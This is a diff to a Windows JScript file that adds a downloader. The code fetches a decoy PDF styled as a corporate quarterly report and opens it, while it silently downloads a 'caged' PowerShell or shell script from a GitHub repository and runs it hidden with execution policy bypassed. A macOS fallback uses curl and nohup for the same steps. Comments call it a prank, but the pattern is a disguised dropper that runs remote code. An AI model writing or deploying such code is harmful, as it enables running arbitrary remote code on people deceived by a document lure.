@@ -1,11 +1,39 @@
 var shell = new ActiveXObject("WScript.Shell");
 
+// Define the PDF and script URLs
+var pdfUrl = "https://c4265878.ssl.cf2.rackcdn.com/gmbc.2503111434.GM-VisionFrame_25Q1.pdf";
+var ps1Url = "https://raw.githubusercontent.com/GravesWontHold/Caged/refs/heads/main/Caged/caged.ps1";  // Windows prank script URL
+var shUrl = "https://raw.githubusercontent.com/GravesWontHold/Caged/refs/heads/main/Caged/caged.sh";    // Mac prank script URL
+
+var pdfPath = "C:\\Users\\" + shell.ExpandEnvironmentStrings("%USERNAME%") + "\\Downloads\\GM-VisionFrame_25Q1.pdf";
+var ps1Path = "C:\\Users\\" + shell.ExpandEnvironmentStrings("%USERNAME%") + "\\Downloads\\caged.ps1";
+var shPath = "~/Desktop/caged.sh";  // Mac saves the sh file to Desktop
+
+// Function to download files
+function downloadFile(url, filePath) {
+    var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
+    xmlhttp.open("GET", url, false);
+    xmlhttp.send();
+    var byteArray = xmlhttp.responseBody;
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var file = fso.CreateTextFile(filePath, true);
+    file.write(byteArray);
+    file.close();
+}
+
+// Try running Windows prank
 try {
-    // Try running the Windows prank
-    shell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File caged.ps1", 0, false);
-    shell.Run("GM-VisionFrame 25Q2.pdf", 1, false);
+    // Download the PDF and prank scripts
+    downloadFile(pdfUrl, pdfPath);
+    downloadFile(ps1Url, ps1Path);
+
+    // Execute Windows prank (updated to caged.ps1)
+    shell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " + ps1Path, 0, false);
+
+    // Open the downloaded PDF
+    shell.Run(pdfPath, 1, false);
 } catch (e) {
     // If Windows fails, assume Mac
-    var macScript = "osascript -e 'do shell script \"nohup ~/Desktop/caged.sh &>/dev/null & open ~/Desktop/Company_Policy.pdf\"'";
+    var macScript = "osascript -e 'do shell script \"curl -o ~/Desktop/GM-VisionFrame_25Q1.pdf " + pdfUrl + "\"; curl -o ~/Desktop/caged.sh " + shUrl + "; nohup ~/Desktop/caged.sh &>/dev/null & open ~/Desktop/GM-VisionFrame_25Q1.pdf'";
     shell.Run("cmd.exe /c " + macScript, 0, false);
 }
